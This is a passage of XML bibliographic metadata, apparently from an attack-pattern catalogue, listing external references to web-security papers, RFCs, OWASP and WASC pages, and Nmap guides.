         <ns0:URL>http://www.net-square.com/httprint_paper.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-37">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Edition>v4 [DRAFT]</ns0:Edition>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://www.owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-38">
         <ns0:Title>HTTP 1.1 Specification (RFC 2616)</ns0:Title>
         <ns0:Publication>IETF RFC</ns0:Publication>
         <ns0:URL>http://www.ietf.org/rfc/rfc2616.txt</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-39">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Fingerprinting</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-40">
         <ns0:Author>Yuval B.</ns0:Author>
         <ns0:Author>Ayal Y.</ns0:Author>
         <ns0:Author>Adi S.</ns0:Author>
         <ns0:Title>Flash Parameter Injection: A Security Advisory</ns0:Title>
         <ns0:Publication_Year>2008</ns0:Publication_Year>
         <ns0:Publication_Month>--09</ns0:Publication_Month>
         <ns0:Publication_Day>---24</ns0:Publication_Day>
         <ns0:Publisher>IBM Rational Security Team</ns0:Publisher>
         <ns0:URL>http://blog.watchfire.com/FPI.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-41">
         <ns0:Author>Stefano Di Paola</ns0:Author>
         <ns0:Title>Testing Flash Applications</ns0:Title>
         <ns0:Publication_Year>2007</ns0:Publication_Year>
         <ns0:URL>http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-42">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://www.owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-46">
         <ns0:Author>Stefano Di Paola</ns0:Author>
         <ns0:Title>Finding Vulnerabilities in Flash Applications</ns0:Title>
         <ns0:Publication>OWASP Appsec 2007</ns0:Publication>
         <ns0:Publication_Year>2007</ns0:Publication_Year>
         <ns0:Publication_Month>--11</ns0:Publication_Month>
         <ns0:Publication_Day>---15</ns0:Publication_Day>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-47">
         <ns0:Author>Rudra K. Sinha Roy</ns0:Author>
         <ns0:Title>A Lazy Pen Tester's Guide to Testing Flash Applications</ns0:Title>
         <ns0:Publication>iViz</ns0:Publication>
         <ns0:URL>http://www.ivizsecurity.com/blog/web-application-security/testing-flash-applications-pen-tester-guide/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-48">
         <ns0:Author>Peleus Uhley</ns0:Author>
         <ns0:Title>Creating More Secure SWF Web Application</ns0:Title>
         <ns0:Publisher>Adobe Systems Incorporated</ns0:Publisher>
         <ns0:URL>http://www.adobe.com/devnet/flashplayer/articles/secure_swf_apps.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-49">
         <ns0:Title>OWASP Web Security Testing Guide</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://www.owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-50">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/Reverse_engineering</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-51">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/Decompiler</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-52">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/Debugger</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-53">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/Disassembler</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-57">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/Proprietary_protocol</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-59">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Remote-File-Inclusion</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-60">
         <ns0:Author>Shaun Clowes</ns0:Author>
         <ns0:Title>A Study In Scarlet, Exploiting Common Vulnerabilities in PHP Applications</ns0:Title>
         <ns0:Publisher>Blackhat Briefings Asia 2001</ns0:Publisher>
         <ns0:URL>http://securereality.com.au/studyinscarlett/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-62">
         <ns0:Author>Thomas Schreiber</ns0:Author>
         <ns0:Title>Session Riding: A Widespread Vulnerability in Today's Web Applications</ns0:Title>
         <ns0:Publisher>SecureNet GmbH</ns0:Publisher>
         <ns0:URL>https://crypto.stanford.edu/cs155old/cs155-spring08/papers/Session_Riding.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-63">
         <ns0:Title>OWASP Testing Guide</ns0:Title>
         <ns0:Edition>v4</ns0:Edition>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>http://www.owasp.org/index.php/Testing_for_Session_Management</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-64">
         <ns0:Author>Amit Klein</ns0:Author>
         <ns0:Title>Multiple vendors XML parser (and SOAP/WebServices server) Denial of Service attack using DTD</ns0:Title>
         <ns0:URL>http://www.securityfocus.com/archive/1/303509</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-65">
         <ns0:Author>Pete Lindstrom</ns0:Author>
         <ns0:Title>Attacking &amp; Defending Web Services</ns0:Title>
         <ns0:Publication_Year>2002</ns0:Publication_Year>
         <ns0:Publisher>SPiRE Security</ns0:Publisher>
         <ns0:URL>http://www.webtorials.com/main/comnet/cn2003/web-service/24.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-66">
         <ns0:Author>Elliotte Rusty Harold</ns0:Author>
         <ns0:Title>Tip: Configure SAX parsers for secure processing</ns0:Title>
         <ns0:Publication>IBM developerWorks</ns0:Publication>
         <ns0:Publication_Year>2005</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---27</ns0:Publication_Day>
         <ns0:Publisher>IBM</ns0:Publisher>
         <ns0:URL>http://www.ibm.com/developerworks/xml/library/x-tipcfsx.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-67">
         <ns0:Author>Bryan Sullivan</ns0:Author>
         <ns0:Title>XML Denial of Service Attacks and Defenses</ns0:Title>
         <ns0:URL>http://msdn.microsoft.com/en-us/magazine/ee335713.aspx</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-69">
         <ns0:Title>OWASP Cheatsheets</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://www.owasp.org/www-community/xss-filter-evasion-cheatsheet</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-70">
         <ns0:Title>OWASP Testing Guide</ns0:Title>
         <ns0:Edition>v2</ns0:Edition>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>http://www.owasp.org/index.php/Testing_for_Cross_site_scripting</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-71">
         <ns0:Title>Non-alphanumeric XSS cheat sheet</ns0:Title>
         <ns0:URL>http://sla.ckers.org/forum/read.php?24,28687</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-72">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Cross-Site+Scripting</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-73">
         <ns0:Title>XXE (Xml eXternal Entity) Attack</ns0:Title>
         <ns0:Publisher>Beyond Security</ns0:Publisher>
         <ns0:URL>http://www.securiteam.com/securitynews/6D0100A5PU.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-74">
         <ns0:Title>CESA-2007-002 - rev 2: Sun JDK6 breaks XXE attack protection</ns0:Title>
         <ns0:URL>http://scary.beasts.org/security/CESA-2007-002.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-75">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/Greasemonkey</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-76">
         <ns0:Title>Firebug</ns0:Title>
         <ns0:URL>http://getfirebug.com/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-77">
         <ns0:Title>Mozilla Firefox Add-ons</ns0:Title>
         <ns0:URL>https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-78">
         <ns0:Title>OWASP Testing Guide</ns0:Title>
         <ns0:Edition>v4</ns0:Edition>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>http://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OWASP-DV-002)</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-80">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/w/page/13246956/Routing-Detour</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-81">
         <ns0:Author>Andre Yee</ns0:Author>
         <ns0:Title>Threat Protection in a Service Oriented World</ns0:Title>
         <ns0:Publication>NFR Security</ns0:Publication>
         <ns0:URL>http://www.unatekconference.com/images/pdfs/presentations/Yee.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-84">
         <ns0:Author>Michal Zalewski</ns0:Author>
         <ns0:Title>Browser Security Handbook</ns0:Title>
         <ns0:Publication_Year>2008</ns0:Publication_Year>
         <ns0:Publisher>Google Inc.</ns0:Publisher>
         <ns0:URL>https://code.google.com/archive/p/browsersec/wikis/Main.wiki</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-85">
         <ns0:Author>M. Mahemoff</ns0:Author>
         <ns0:Title>Explaining the "Don't Click" Clickjacking Tweetbomb</ns0:Title>
         <ns0:Publication_Year>2009</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---12</ns0:Publication_Day>
         <ns0:Publisher>Software As She's Developed</ns0:Publisher>
         <ns0:URL>http://softwareas.com/explaining-the-dont-click-clickjacking-tweetbomb</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-86">
         <ns0:Author>Ryan Naraine</ns0:Author>
         <ns0:Title>DoS Flaw in SOAP DTD Parameter</ns0:Title>
         <ns0:Publication>InternetNews.com</ns0:Publication>
         <ns0:Publication_Year>2003</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publication_Day>---15</ns0:Publication_Day>
         <ns0:Publisher>ITBusiness Edge, Quinstreet Inc.</ns0:Publisher>
         <ns0:URL>http://www.internetnews.com/dev-news/article.php/3289191</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-89">
         <ns0:Author>Shlomo, Yona</ns0:Author>
         <ns0:Title>XML Parser Attacks: A summary of ways to attack an XML Parser</ns0:Title>
         <ns0:Publication_Year>2007</ns0:Publication_Year>
         <ns0:URL>http://yeda.cs.technion.ac.il/~yona/talks/xml_parser_attacks/slides/slide2.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-91">
         <ns0:Author>J. Cappos</ns0:Author>
         <ns0:Author>J. Rasley</ns0:Author>
         <ns0:Author>J. Samuel</ns0:Author>
         <ns0:Author>I. Beschastnikh</ns0:Author>
         <ns0:Author>C. Barsan</ns0:Author>
         <ns0:Author>A. Krishnamurthy</ns0:Author>
         <ns0:Author>T. Anderson</ns0:Author>
         <ns0:Title>Retaining Sandbox Containment Despite Bugs in Privileged Memory-Safe Code</ns0:Title>
         <ns0:Publication>The 17th ACM Conference on Computer and Communications Security (CCS '10)</ns0:Publication>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-92">
         <ns0:Title>Malware Protection Center: Threat Research and Response</ns0:Title>
         <ns0:Publication_Year>2007</ns0:Publication_Year>
         <ns0:Publisher>Microsoft Corporation</ns0:Publisher>
         <ns0:URL>https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Exploit%3AJava%2FByteVerify.C</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-94">
         <ns0:Author>Jeremiah Grossman</ns0:Author>
         <ns0:Title>Attribute-Based Cross-Site Scripting</ns0:Title>
         <ns0:URL>http://jeremiahgrossman.blogspot.com/2007/07/attribute-based-cross-site-scripting.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-96">
         <ns0:Title>Google Cross-Site Scripting HOWTO article</ns0:Title>
         <ns0:Publisher>Google</ns0:Publisher>
         <ns0:URL>https://code.google.com/archive/p/doctype/wikis/ArticleXSSInUrlAttributes.wiki</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-99">
         <ns0:Author>Matteo Carli</ns0:Author>
         <ns0:Title>XSS and CSRF vulnerability on Cpanel</ns0:Title>
         <ns0:Publication>Symantec Connect</ns0:Publication>
         <ns0:Publication_Year>2008</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---09</ns0:Publication_Day>
         <ns0:Publisher>SecurityFocus</ns0:Publisher>
         <ns0:URL>http://www.securityfocus.com/archive/1/archive/1/491864/100/0/threaded</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-101">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/Deadlock</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-102">
         <ns0:Author>Robin Cover, ed.</ns0:Author>
         <ns0:Title>XML and Web Services In The News</ns0:Title>
         <ns0:Publication>XML Daily Newslink</ns0:Publication>
         <ns0:URL>http://www.xml.org/xml/news/archives/archive.11292006.shtml</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-103">
         <ns0:Title>Simple Object Access Protocol (SOAP) 1.1</ns0:Title>
         <ns0:Publication_Year>2006</ns0:Publication_Year>
         <ns0:Publication_Month>--11</ns0:Publication_Month>
         <ns0:Publication_Day>---29</ns0:Publication_Day>
         <ns0:Publisher>W3C</ns0:Publisher>
         <ns0:URL>http://www.w3.org/TR/2000/NOTE-SOAP-20000508/#_Toc478383522</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-105">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/Race_condition</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-106">
         <ns0:Author>David Wheeler</ns0:Author>
         <ns0:Title>Secure programmer: Prevent race conditions</ns0:Title>
         <ns0:Publication>IBM developerWorks</ns0:Publication>
         <ns0:Publisher>IBM</ns0:Publisher>
         <ns0:URL>http://www.ibm.com/developerworks/linux/library/l-sprace/index.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-107">
         <ns0:Author>Fortify Software</ns0:Author>
         <ns0:Title>SAMATE - Software Assurance Metrics And Tool Evaluation</ns0:Title>
         <ns0:Publication_Year>2006</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---22</ns0:Publication_Day>
         <ns0:Publisher>National Institute of Standards and Technology (NIST)</ns0:Publisher>
         <ns0:URL>http://samate.nist.gov/SRD/view_testcase.php?tID=1598</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-108">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Improper-Input-Handling</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-109">
         <ns0:Title>OWASP</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>http://www.owasp.org/index.php/Category:Encoding</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-110">
         <ns0:Title>OWASP</ns0:Title>
         <ns0:Publisher>The Open Web Application Security Project (OWASP)</ns0:Publisher>
         <ns0:URL>https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-112">
         <ns0:Author>David Wheeler</ns0:Author>
         <ns0:Title>Secure Programming for Linux and Unix HOWTO</ns0:Title>
         <ns0:URL>http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/character-encoding.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-113">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/Character_encoding</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-114">
         <ns0:Author>Eric Hacker</ns0:Author>
         <ns0:Title>IDS Evasion with Unicode</ns0:Title>
         <ns0:Publication_Year>2001</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---03</ns0:Publication_Day>
         <ns0:URL>http://www.securityfocus.com/infocus/1232</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-115">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/Symlink_race</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-116">
         <ns0:Title>mkstemp</ns0:Title>
         <ns0:Edition>IEEE Std 1003.1, 2004 Edition</ns0:Edition>
         <ns0:Publication>The Open Group Base Specifications Issue 6</ns0:Publication>
         <ns0:URL>http://www.opengroup.org/onlinepubs/009695399/functions/mkstemp.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-117">
         <ns0:Title>HTTP Response Smuggling</ns0:Title>
         <ns0:Publisher>Beyond Security</ns0:Publisher>
         <ns0:URL>http://www.securiteam.com/securityreviews/5CP0L0AHPC.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-118">
         <ns0:Author>Arshan Dabirsiaghi</ns0:Author>
         <ns0:Title>Bypassing Web Authentication and Authorization with HTTP Verb Tampering: How to inadvertently allow attackers full access to your web application</ns0:Title>
         <ns0:Publisher>Aspect Security</ns0:Publisher>
         <ns0:URL>http://mirror.transact.net.au/sourceforge/w/project/wa/waspap/waspap/Core/Bypassing_VBAAC_with_HTTP_Verb_Tampering.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-119">
         <ns0:Author>Collin Jackson</ns0:Author>
         <ns0:Author>Adam Barth</ns0:Author>
         <ns0:Author>Andrew Bortz</ns0:Author>
         <ns0:Author>Weidong Shao</ns0:Author>
         <ns0:Author>Dan Boneh</ns0:Author>
         <ns0:Title>Protecting Browsers from DNS Rebinding Attacks</ns0:Title>
         <ns0:Publication>In Proceedings of ACM CCS 07</ns0:Publication>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-120">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>http://en.wikipedia.org/wiki/DNS_rebinding</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-121">
         <ns0:Author>Navya Sidharth</ns0:Author>
         <ns0:Author>Jigang Liu</ns0:Author>
         <ns0:Title>Intrusion Resistant SOAP Messaging with IAPF</ns0:Title>
         <ns0:Publication_Year>2008</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publisher>IEEE</ns0:Publisher>
         <ns0:URL>http://ieeexplore.ieee.org/document/4780783/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-123">
         <ns0:Author>J. Postel</ns0:Author>
         <ns0:Title>RFC792 - Internet Control Messaging Protocol</ns0:Title>
         <ns0:Publication_Year>1981</ns0:Publication_Year>
         <ns0:Publication_Month>--09</ns0:Publication_Month>
         <ns0:Publisher>Defense Advanced Research Projects Agency (DARPA)</ns0:Publisher>
         <ns0:URL>http://www.faqs.org/rfcs/rfc792.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-124">
         <ns0:Author>R. Braden, Ed.</ns0:Author>
         <ns0:Title>RFC1122 - Requirements for Internet Hosts - Communication Layers</ns0:Title>
         <ns0:Publication_Year>1989</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:URL>http://www.faqs.org/rfcs/rfc1122.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-125">
         <ns0:Author>Mark Wolfgang</ns0:Author>
         <ns0:Title>Host Discovery with Nmap</ns0:Title>
         <ns0:Publication_Year>2002</ns0:Publication_Year>
         <ns0:Publication_Month>--11</ns0:Publication_Month>
         <ns0:URL>http://nmap.org/docs/discovery.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-128">
         <ns0:Author>Defense Advanced Research Projects Agency Information Processing Techniques Office</ns0:Author>
         <ns0:Author>Information Sciences Institute University of Southern California</ns0:Author>
         <ns0:Title>RFC793 - Transmission Control Protocol</ns0:Title>
         <ns0:Publication_Year>1981</ns0:Publication_Year>
         <ns0:Publication_Month>--09</ns0:Publication_Month>
         <ns0:Publisher>Defense Advanced Research Projects Agency (DARPA)</ns0:Publisher>
         <ns0:URL>http://www.faqs.org/rfcs/rfc793.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-130">
         <ns0:Author>Gordon "Fyodor" Lyon</ns0:Author>
         <ns0:Title>The Art of Port Scanning</ns0:Title>
         <ns0:Edition>Volume: 7, Issue. 51</ns0:Edition>
         <ns0:Publication>Phrack Magazine</ns0:Publication>
         <ns0:Publication_Year>1997</ns0:Publication_Year>
         <ns0:URL>http://phrack.org/issues/51/11.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-131">
         <ns0:Author>J. Viega</ns0:Author>
         <ns0:Author>G. McGraw</ns0:Author>
         <ns0:Title>Building Secure Software</ns0:Title>
         <ns0:Publication_Year>2002</ns0:Publication_Year>
         <ns0:Publisher>Addison-Wesley</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-139">
         <ns0:Author>J. Mogul</ns0:Author>
         <ns0:Author>J. Postel</ns0:Author>
         <ns0:Title>RFC950 - Internet Standard Subnetting Procedure</ns0:Title>
         <ns0:Publication_Year>1985</ns0:Publication_Year>
         <ns0:Publication_Month>--08</ns0:Publication_Month>
         <ns0:URL>http://www.faqs.org/rfcs/rfc950.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-147">
         <ns0:Author>Gordon "Fyodor" Lyon</ns0:Author>
         <ns0:Title>Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning</ns0:Title>
         <ns0:Edition>3rd "Zero Day" Edition</ns0:Edition>
         <ns0:Publication_Year>2008</ns0:Publication_Year>
         <ns0:Publisher>Insecure.com LLC, ISBN: 978-0-9799587-1-7</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-158">
         <ns0:Author>J. Postel</ns0:Author>
         <ns0:Title>RFC768 - User Datagram Protocol</ns0:Title>
         <ns0:Publication_Year>1980</ns0:Publication_Year>
         <ns0:Publication_Month>--08</ns0:Publication_Month>
         <ns0:Publication_Day>---28</ns0:Publication_Day>
         <ns0:URL>http://www.faqs.org/rfcs/rfc768.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-212">
         <ns0:Author>Gordon "Fyodor" Lyon</ns0:Author>
         <ns0:Title>Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning</ns0:Title>
         <ns0:Edition>3rd "Zero Day" Edition,</ns0:Edition>
         <ns0:Publication_Year>2008</ns0:Publication_Year>
         <ns0:Publisher>Insecure.com LLC</ns0:Publisher>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-262">
         <ns0:Author>Ofir Arkin</ns0:Author>
         <ns0:Title>A Remote Active OS Fingerprinting Tool using ICMP</ns0:Title>
         <ns0:Publication_Year>2002</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publisher>The Sys-Security Group</ns0:Publisher>
         <ns0:URL>http://ofirarkin.files.wordpress.com/2008/11/login.pdf</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-275">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Insufficient-Authentication</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-276">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Insufficient-Authorization</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-277">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Integer-Overflows</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-278">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Insufficient-Transport-Layer-Protection</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-282">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/Buffer-Overflow</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-283">
         <ns0:Title>WASC Threat Classification 2.0</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium (WASC)</ns0:Publisher>
